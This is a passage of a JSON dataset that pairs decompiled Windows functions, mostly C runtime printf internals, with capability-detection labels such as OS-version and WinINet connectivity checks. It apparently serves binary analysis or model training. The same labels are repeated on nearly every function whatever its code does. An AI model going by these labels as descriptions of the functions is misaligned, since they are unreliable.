        "decompiled_code": "\nvoid fcn.00408dc0(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint64_t uVar5;\n    uint var_18h;\n    uint16_t *var_14h;\n    uint *var_8h;\n    \n    puVar4 = &fcn.00408dc0::var_18h;\n    for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    var_14h = NULL;\n    uVar5 = fcn.004065e0(&fcn.00408dc0::var_14h);\n    if ((uVar5 & 0xff) == 0) {\n        uVar2 = 0;\n        var_8h = uVar5 >> 0x20;\n    }\n    else {\n        uVar5 = fcn.00407e40();\n        if ((uVar5 & 0xff) == 0) {\n            uVar2 = 1;\n            var_8h = uVar5 >> 0x20;\n        }\n        else {\n            if ((var_14h == NULL) || (*(var_14h + 2) == 0)) {\n                uVar2 = fcn.00407970();\n                var_8h[0xd] = uVar2;\n                uVar2 = sub.msvcrt.dll_strlen(var_8h[0xd]);\n                var_8h[0xe] = uVar2;\n                *(var_8h + 0xf) = 0;\n            }\n            else {\n                cVar1 = fcn.00406750(*var_8h, var_8h[1], *(var_8h + 0x31), var_8h[0xb]);\n                if (cVar1 == '\\0') {\n                    var_8h[0xd] = *(var_14h + 2);\n                    var_8h[0xe] = *var_14h;\n                    *(var_8h + 0xf) = 0;\n                }\n                else {\n                    var_8h[0xd] = *(var_14h + 2);\n                    var_8h[0xe] = *var_14h / 2;\n                    *(var_8h + 0xf) = 1;\n                    var_8h = NULL;\n                }\n            }\n            uVar2 = 1;\n        }\n    }\n    fcn.00411450(uVar2, var_8h);\n    var_8h = 0x408edf;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 607
    },
    "00408f00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00408f00(void)\n\n{\n    uint arg_24h;\n    uint arg_28h;\n    uint arg_20h;\n    char cVar1;\n    uint uVar2;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    uint arg_ch;\n    int32_t iVar3;\n    uint *puVar4;\n    uint64_t uVar5;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_40h;\n    uint var_18h;\n    uint var_14h;\n    uint *var_8h;\n    \n    puVar4 = &fcn.00408f00::var_40h;\n    for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.00407e10(0x10);\n    uVar5 = fcn.00407e40();\n    if ((uVar5 & 0xff) == 0) {\n        uVar2 = 0;\n        var_8h = uVar5 >> 0x20;\n    }\n    else {\n        uVar5 = fcn.00407e40();\n        if ((uVar5 & 0xff) == 0) {\n            uVar2 = 1;\n            var_8h = uVar5 >> 0x20;\n        }\n        else {\n            if (var_8h[10] < 0) {\n                if ((*(var_8h + 0x31) == 'a') || (*(var_8h + 0x31) == 'A')) {\n                    var_8h[10] = 0xd;\n                }\n                else {\n                    var_8h[10] = 6;\n                }\n            }\n            else if ((var_8h[10] == 0) && ((*(var_8h + 0x31) == 'g' || (*(var_8h + 0x31) == 'G')))) {\n                var_8h[10] = 1;\n            }\n            cVar1 = fcn.00406210(var_8h[10] + 0x15d);\n            if (cVar1 == '\\0') {\n                iVar3 = fcn.00406150();\n                var_8h[10] = iVar3 + -0x15d;\n            }\n            uVar2 = fcn.004061b0();\n            var_8h[0xd] = uVar2;\n            var_18h = 0;\n            var_14h = 0;\n            uVar5 = fcn.00406630(&fcn.00408f00::var_18h);\n            if ((uVar5 & 0xff) == 0) {\n                uVar2 = 0;\n                var_8h = uVar5 >> 0x20;\n            }\n            else {\n                uVar2 = var_8h[2];\n                arg_24h = *var_8h;\n                arg_28h = var_8h[1];\n                arg_20h = var_8h[10];\n                cVar1 = *(var_8h + 0x31);\n                arg_18h = fcn.00406900();\n                arg_14h = fcn.00406940();\n                arg_10h = fcn.00406150();\n                arg_ch = fcn.004061b0();\n                fcn.0040d5a0(&fcn.00408f00::var_18h, arg_ch, arg_10h, arg_14h, arg_18h, cVar1, arg_20h, arg_24h, arg_28h\n                             , uVar2);\n                cVar1 = fcn.00407930(0x20);\n                if ((cVar1 != '\\0') && (var_8h[10] == 0)) {\n                    fcn.004077d0(var_8h[0xd], var_8h[2]);\n                }\n                if (((*(var_8h + 0x31) == 'g') || (*(var_8h + 0x31) == 'G')) &&\n                   (cVar1 = fcn.00407930(0x20),  cVar1 == '\\0')) {\n                    fcn.004075b0(var_8h[0xd], var_8h[2]);\n                }\n                if (*var_8h[0xd] == '-') {\n                    fcn.00407e10(0x40);\n                    var_8h[0xd] = var_8h[0xd] + 1;\n                }\n                if (((*var_8h[0xd] == 'i') || (*var_8h[0xd] == 'I')) || ((*var_8h[0xd] == 'n' || (*var_8h[0xd] == 'N')))\n                   ) {\n                    fcn.00409d50(8);\n                    *(var_8h + 0x31) = 0x73;\n                }\n                uVar2 = sub.msvcrt.dll_strlen(var_8h[0xd]);\n                var_8h[0xe] = uVar2;\n                uVar2 = 1;\n            }\n        }\n    }\n    fcn.00411450(uVar2, var_8h);\n    var_18h = 0x40920d;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1276
    },
    "00409270": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00409270(uint *param_1)\n\n{\n    ushort uVar1;\n    char cVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint64_t uVar7;\n    ulong uVar8;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e6h;\n    uint var_30h;\n    int32_t var_20h;\n    uint var_14h;\n    uint *var_8h;\n    \n    puVar6 = &fcn.00409270::var_30h;\n    for (iVar5 = 0xc; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0xcccccccc;\n        puVar6 = puVar6 + 1;\n    }\n    var_8h = param_1;\n    cVar2 = fcn.00406750(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar2 == '\\0') {\n        uVar3 = fcn.004061b0();\n        uVar7 = fcn.00406480(uVar3);\n        uVar3 = uVar7 >> 0x20;\n        if ((uVar7 & 0xff) == 0) {\n            uVar4 = 0;\n            goto code_r0x004093af;\n        }\n        uVar7 = fcn.00407e40();\n        uVar3 = uVar7 >> 0x20;\n        if ((uVar7 & 0xff) == 0) {\n            uVar4 = 1;\n            goto code_r0x004093af;\n        }\n        var_8h[0xe] = 1;\n    }\n    else {\n        var_14h._0_2_ = 0;\n        uVar7 = fcn.00406700(&fcn.00409270::var_14h);\n        uVar3 = uVar7 >> 0x20;\n        if ((uVar7 & 0xff) == 0) {\n            uVar4 = 0;\n            goto code_r0x004093af;\n        }\n        uVar7 = fcn.00407e40();\n        uVar1 = var_14h;\n        uVar3 = uVar7 >> 0x20;\n        if ((uVar7 & 0xff) == 0) {\n            uVar4 = 1;\n            goto code_r0x004093af;\n        }\n        uVar3 = fcn.00406150();\n        uVar4 = fcn.004061b0();\n        var_20h = sub.msvcrt.dll_wctomb_s(var_8h + 0xe, uVar4, uVar3, uVar1);\n        if (var_20h != 0) {\n            *(var_8h + 0xc) = 1;\n        }\n    }\n    uVar8 = fcn.004061b0();\n    uVar3 = uVar8 >> 0x20;\n    var_8h[0xd] = uVar8;\n    uVar4 = 1;\ncode_r0x004093af:\n    fcn.00411450(uVar4, uVar3);\n    var_8h = 0x4093d0;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 770
    },
    "00409450": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004095da)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409450(uint arg_8h, uint32_t arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    char **ppcVar5;\n    int32_t *piVar6;\n    int32_t in_ECX;\n    int32_t iVar7;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    int32_t extraout_EDX_05;\n    int32_t extraout_EDX_06;\n    ulong uVar8;\n    uint64_t uVar9;\n    uint var_114h;\n    uint var_54h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    int32_t var_3ch;\n    uint var_2dh;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_14h;\n    uint uStack16;\n    int32_t var_8h;\n    \n    puVar3 = &fcn.00409450::var_54h;\n    for (iVar7 = 0x15; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = in_ECX;\n    var_14h = fcn.00408cc0(*(in_ECX + 0x2c));\n    var_24h = 0;\n    var_20h = 0;\n    var_2dh._0_1_ = '\\0';\n    // switch table (8 cases) at 0x409820\n    switch(var_14h) {\n    case 1:\n        cVar2 = fcn.00407930(0x10);\n        if (cVar2 == '\\0') {\n            var_2dh._0_1_ = fcn.004063c0(&fcn.00409450::var_24h);\n            iVar7 = extraout_EDX_00;\n        }\n        else {\n            var_2dh._0_1_ = fcn.00406360(&fcn.00409450::var_24h);\n            iVar7 = extraout_EDX;\n        }\n        break;\n    case 2:\n        cVar2 = fcn.00407930(0x10);\n        if (cVar2 == '\\0') {\n            var_2dh._0_1_ = fcn.004064d0(&fcn.00409450::var_24h);\n            iVar7 = extraout_EDX_02;\n        }\n        else {\n            var_2dh._0_1_ = fcn.00406420(&fcn.00409450::var_24h);\n            iVar7 = extraout_EDX_01;\n        }\n        break;\n    default:\n        var_3ch = 0;\n        uVar8 = fcn.00405830(2, 0x4135a0, 0x9cb, 0, 0x41322c, L\"(\\\"Invalid integer length modifier\\\", 0)\");\n        iVar7 = uVar8 >> 0x20;\n        if (uVar8 == 1) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (var_3ch == 0) {\n            puVar3 = sub.msvcrt.dll__errno();\n            *puVar3 = 0x16;\n            uVar8 = fcn.00405a50(L\"(\\\"Invalid integer length modifier\\\", 0)\", \n                                 L\"__crt_stdio_output::output_processor<char,class __crt_stdio_output::stream_output_adapter<char>,class __crt_stdio_output::standard_base<char,class __crt_stdio_output::stream_output_adapter<char> > >::type_case_integer\"\n                                 , 0x4135a0, 0x9cb, 0);\n            iVar7 = uVar8 >> 0x20;\n            uVar4 = 0;\n            goto code_r0x004097d5;\n        }\n        break;\n    case 4:\n        cVar2 = fcn.00407930(0x10);\n        if (cVar2 == '\\0') {\n            var_2dh._0_1_ = fcn.00406580(&fcn.00409450::var_24h);\n            iVar7 = extraout_EDX_04;\n        }\n        else {\n            var_2dh._0_1_ = fcn.00406530(&fcn.00409450::var_24h);\n            iVar7 = extraout_EDX_03;\n        }\n        break;\n    case 8:\n        cVar2 = fcn.00407930(0x10);\n        if (cVar2 == '\\0') {\n            var_2dh._0_1_ = fcn.004066b0(&fcn.00409450::var_24h);\n            iVar7 = extraout_EDX_06;\n        }\n        else {\n            var_2dh._0_1_ = fcn.004066b0(&fcn.00409450::var_24h);\n            iVar7 = extraout_EDX_05;\n        }\n    }\n    if (var_2dh == '\\0') {\n        uVar4 = 0;\n        goto code_r0x004097d5;\n    }\n    uVar9 = fcn.00407e40();\n    iVar7 = uVar9 >> 0x20;\n    if ((uVar9 & 0xff) == 0) {\n        uVar4 = 1;\n        goto code_r0x004097d5;\n    }\n    var_4ch = 0;\n    var_48h = 0;\n    cVar2 = fcn.00407930(0x10);\n    if (((cVar2 == '\\0') || (0 < var_20h)) || (-1 < var_20h)) {\n        var_4ch = var_24h;\n        var_48h = var_20h;\n    }\n    else {\n        var_4ch = -var_24h;\n        var_48h = -(var_20h + (var_24h != 0));\n        fcn.00407e10(0x40);\n    }\n    if (*(var_8h + 0x28) < 0) {\n        *(var_8h + 0x28) = 1;\n    }\n    else {\n        fcn.00409d50(8);\n        fcn.00406210(*(var_8h + 0x28));\n    }\n    if ((var_4ch | var_48h) == 0) {\n        fcn.00409d50(0x20);\n    }\n    *(var_8h + 0x3c) = 0;\n    if (var_14h == 8) {\n        fcn.00406b00(var_4ch, var_4ch, arg_8h, arg_ch & 0xff);\n    }\n    else {\n        fcn.00406a00(var_4ch, arg_8h, arg_ch & 0xff);\n    }\n    uVar9 = fcn.00407930(0x80);\n    iVar7 = uVar9 >> 0x20;\n    if ((uVar9 & 0xff) != 0) {\n        if (*(var_8h + 0x38) != 0) {\n            ppcVar5 = fcn.00408c80();\n            iVar7 = 0;\n            if (**ppcVar5 == '0') goto code_r0x004097d3;\n        }\n        piVar6 = fcn.00408c80();\n        *piVar6 = *piVar6 + -1;\n        **piVar6 = 0x30;\n        *(var_8h + 0x38) = *(var_8h + 0x38) + 1;\n        iVar7 = var_8h;\n    }\ncode_r0x004097d3:\n    uVar4 = 1;\ncode_r0x004097d5:\n    fcn.00411450(uVar4, iVar7);\n    uStack16 = 0x4097f6;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1897
    },
    "00409840": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004099b4)\n// WARNING: Removing unreachable block (ram,0x004098a8)\n\nvoid fcn.00409840(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    ulong uVar7;\n    uint var_f4h;\n    uint var_34h;\n    int32_t var_2ch;\n    int32_t var_20h;\n    uint32_t *var_14h;\n    int32_t var_8h;\n    \n    puVar3 = &fcn.00409840::var_34h;\n    for (iVar4 = 0xd; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_14h = NULL;\n    uVar6 = fcn.004065e0(&fcn.00409840::var_14h);\n    uVar5 = uVar6 >> 0x20;\n    if ((uVar6 & 0xff) == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar6 = fcn.00407e40();\n        uVar5 = uVar6 >> 0x20;\n        if ((uVar6 & 0xff) == 0) {\n            uVar2 = 1;\n        }\n        else {\n            iVar4 = fcn.0040de10();\n            if (iVar4 == 0) {\n                var_20h = 0;\n                uVar7 = fcn.00405830(2, 0x4135a0, 0xa47, 0, 0x41322c, L\"(\\\"\\'n\\' format specifier disabled\\\", 0)\");\n                uVar5 = uVar7 >> 0x20;\n                if (uVar7 == 1) {\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                if (var_20h == 0) {\n                    puVar3 = sub.msvcrt.dll__errno();\n                    *puVar3 = 0x16;\n                    uVar7 = fcn.00405a50(L\"(\\\"\\'n\\' format specifier disabled\\\", 0)\", \n                                         L\"__crt_stdio_output::output_processor<char,class __crt_stdio_output::stream_output_adapter<char>,class __crt_stdio_output::standard_base<char,class __crt_stdio_output::stream_output_adapter<char> > >::type_case_n\"\n                                         , 0x4135a0, 0xa47, 0);\n                    uVar5 = uVar7 >> 0x20;\n                    uVar2 = 0;\n                }\n                else {\n                    uVar2 = 0;\n                }\n            }\n            else {\n                iVar4 = fcn.00408cc0(*(var_8h + 0x2c));\n                uVar5 = iVar4 - 1;\n    // switch table (8 cases) at 0x409a78\n                switch(uVar5) {\n                case 0:\n                    uVar5 = uVar5 & 0xffffff00 | *(var_8h + 0x18);\n                    *var_14h = *(var_8h + 0x18);\n                    break;\n                case 1:\n                    uVar5 = uVar5 & 0xffff0000 | *(var_8h + 0x18);\n                    *var_14h = *(var_8h + 0x18);\n                    break;\n                default:\n                    var_2ch = 0;\n                    uVar7 = fcn.00405830(2, 0x4135a0, 0xa51, 0, 0x41322c, L\"(\\\"Invalid integer length modifier\\\", 0)\");\n                    uVar5 = uVar7 >> 0x20;\n                    if (uVar7 == 1) {\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                    if (var_2ch == 0) {\n                        puVar3 = sub.msvcrt.dll__errno();\n                        *puVar3 = 0x16;\n                        uVar7 = fcn.00405a50(L\"(\\\"Invalid integer length modifier\\\", 0)\", \n                                             L\"__crt_stdio_output::output_processor<char,class __crt_stdio_output::stream_output_adapter<char>,class __crt_stdio_output::standard_base<char,class __crt_stdio_output::stream_output_adapter<char> > >::type_case_n\"\n                                             , 0x4135a0, 0xa51, 0);\n                        uVar5 = uVar7 >> 0x20;\n                        uVar2 = 0;\n                        goto code_r0x00409a3b;\n                    }\n                    break;\n                case 3:\n                    uVar5 = *(var_8h + 0x18);\n                    *var_14h = uVar5;\n                    break;\n                case 7:\n                    uVar5 = *(var_8h + 0x18) >> 0x1f;\n                    *var_14h = *(var_8h + 0x18);\n                    var_14h[1] = uVar5;\n                }\n                *(var_8h + 0x30) = 1;\n                uVar2 = 1;\n            }\n        }\n    }\ncode_r0x00409a3b:\n    fcn.00411450(uVar2, uVar5);\n    var_8h = 0x409a5c;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1258
    },
    "00409b60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409b60(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_dch;\n    uint var_1ch;\n    uint var_14h;\n    uint uStack20;\n    uint *var_8h;\n    \n    puVar4 = &fcn.00409b60::var_1ch;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    var_8h = param_1;\n    cVar1 = fcn.004065e0(param_1 + 0xd);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00407e40(),  cVar1 != '\\0')) {\n        if (var_8h[10] == -1) {\n            var_dch = 0x7fffffff;\n        }\n        else {\n            var_dch = var_8h[10];\n        }\n        var_14h = var_dch;\n        cVar1 = fcn.00406750(*var_8h, var_8h[1], *(var_8h + 0x31), var_8h[0xb]);\n        if (cVar1 == '\\0') {\n            if (var_8h[0xd] == 0) {\n                uVar2 = fcn.00407970();\n                var_8h[0xd] = uVar2;\n            }\n            uVar2 = fcn.00409c80(var_14h);\n            var_8h[0xe] = uVar2;\n        }\n        else {\n            if (var_8h[0xd] == 0) {\n                uVar2 = fcn.00409fc0();\n                var_8h[0xd] = uVar2;\n            }\n            *(var_8h + 0xf) = 1;\n            uVar2 = sub.msvcrt.dll_wcsnlen(var_8h[0xd], var_14h);\n            var_8h[0xe] = uVar2;\n        }\n    }\n    uStack20 = 0x409c75;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 530
    },
    "00409e20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00409e20(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_8h;\n    int32_t iVar4;\n    uint32_t var_dch;\n    uint var_1ch;\n    uint32_t var_14h;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00409e20::var_1ch;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar2 = fcn.00405480();\n    var_dch = cVar2 != '\\0';\n    var_14h = var_dch;\n    if ((var_dch == 0) && (iVar4 = fcn.00405830(2, 0x4135a0, 0x98, 0, 0x41322c, L\"_stream.valid()\"),  iVar4 == 1)) {\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (var_14h == 0) {\n        puVar3 = sub.msvcrt.dll__errno();\n        *puVar3 = 0x16;\n        fcn.00405a50(L\"_stream.valid()\", L\"__crt_stdio_output::stream_output_adapter<char>::validate\", 0x4135a0, 0x98, 0\n                    );\n    }\n    else {\n        arg_8h = fcn.00405460();\n        fcn.00409f00(arg_8h);\n    }\n    uStack8 = 0x409eee;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 408
    },
    "00409f00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409f00(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t var_d0h;\n    uint var_10h;\n    uint32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00409f00::var_10h;\n    for (iVar3 = 4; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_d0h = arg_8h != 0;\n    var_8h = var_d0h;\n    if ((var_d0h == 0) &&\n       (iVar3 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\inc\\\\corecrt_internal_stdio.h\", 0x1ae, 0, \n                             0x41322c, 0x413374),  iVar3 == 1)) {\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (var_8h == 0) {\n        puVar2 = sub.msvcrt.dll__errno();\n        *puVar2 = 0x16;\n        fcn.00405a50(0x413374, L\"__acrt_stdio_char_traits<char>::validate_stream_is_ansi_if_required\", \n                     L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\inc\\\\corecrt_internal_stdio.h\", 0x1ae, 0);\n    }\n    uStack8 = 0x409fb1;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 410
    },
    "0040a0d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a0d0(int32_t param_1, uint param_2)\n\n{\n    ushort uVar1;\n    unkbyte3 Var2;\n    int32_t iVar3;\n    uint extraout_EDX;\n    uint *puVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint var_114h;\n    uint var_54h;\n    uint32_t var_4ch;\n    int32_t var_40h;\n    uint var_34h;\n    int32_t var_24h;\n    ushort *var_18h;\n    uint uStack24;\n    int32_t var_ch;\n    uint32_t var_4h;\n    \n    puVar4 = &fcn.0040a0d0::var_54h;\n    for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    var_ch = param_1;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        iVar3 = param_1 + 0xc;\n        uVar6 = fcn.0040a270(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, iVar3);\n        param_1 = iVar3;\n    }\n    else {\n        var_18h = *(param_1 + 0x34);\n        for (var_24h = 0; uVar6 = CONCAT44(param_2, var_ch),  var_24h != *(var_ch + 0x38); var_24h = var_24h + 1) {\n            var_40h = 0;\n            uVar1 = *var_18h;\n            var_18h = var_18h + 1;\n            uVar5 = sub.msvcrt.dll_wctomb_s(&fcn.0040a0d0::var_40h, &fcn.0040a0d0::var_34h, 6, uVar1);\n            var_4ch = uVar5;\n            if ((var_4ch != 0) || (var_40h == 0)) {\n                *(var_ch + 0x18) = 0xffffffff;\n                Var2 = var_ch >> 8;\n                goto code_r0x0040a201;\n            }\n            fcn.0040a270(&fcn.0040a0d0::var_34h, var_40h, var_ch + 0x18, var_ch + 0xc);\n            param_2 = extraout_EDX;\n        }\n    }\n    uVar5 = uVar6 & 0xffffffff00000000 | var_4ch;\n    Var2 = uVar6 >> 8;\ncode_r0x0040a201:\n    var_4ch = uVar5;\n    fcn.00411450(CONCAT31(Var2, 1), uVar5 >> 0x20);\n    fcn.00405180(param_1);\n    uStack24 = 0x40a22c;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 753
    },
    "0040a3b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a3b0(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040a3b0::var_8h;\n    for (iVar1 = 2; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (arg_ch == NULL) {\n        var_c8h = sub.msvcrt.dll___pctype_func();\n    }\n    else {\n        var_c8h = *(*arg_ch + 200);\n    }\n    fcn.0040a430(var_c8h, arg_8h, 0x8000);\n    uStack8 = 0x40a423;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 234
    },
    "0040a4c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a4c0(uint arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d0h;\n    uint var_10h;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040a4c0::var_10h;\n    for (iVar1 = 4; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (arg_10h == NULL) {\n        var_d0h = sub.msvcrt.dll___pctype_func();\n    }\n    else {\n        var_d0h = *(*arg_10h + 200);\n    }\n    var_8h = var_d0h;\n    uStack8 = 0x40a526;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 231
    },
    "0040a570": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a570(uint c, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (arg_ch == 0) {\n        sub.msvcrt.dll_tolower(c);\n    }\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 133
    },
    "0040a730": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
